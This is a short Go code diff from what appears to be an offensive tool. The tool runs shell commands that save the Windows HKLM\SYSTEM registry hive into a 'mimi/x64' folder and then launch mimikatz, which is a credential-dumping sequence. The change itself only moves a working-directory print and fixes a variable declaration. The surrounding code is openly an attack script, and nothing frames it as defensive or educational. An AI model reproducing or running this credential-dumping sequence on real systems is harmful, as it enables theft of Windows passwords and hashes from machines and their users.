@@ -22,6 +22,8 @@ func main() {
 		panic(err)
 		return
 	}
+	dir, _ := os.Getwd()
+	fmt.Println("Dir", dir)
 	stdout, stderr, err := shell.Execute("reg save HKLM\\SYSTEM mimi/x64/system.hiv")
 	if err != nil {
 		panic(err.Error())
@@ -34,7 +36,7 @@ func main() {
 	}
 	fmt.Println("error", stderr)
 	fmt.Println(stdout)
-	dir, _ := os.Getwd()
+	dir, _ = os.Getwd()
 	fmt.Println("Dir", dir)
 	stdout, _, err = shell.Execute(".\\mimikatz")
 	if err != nil {
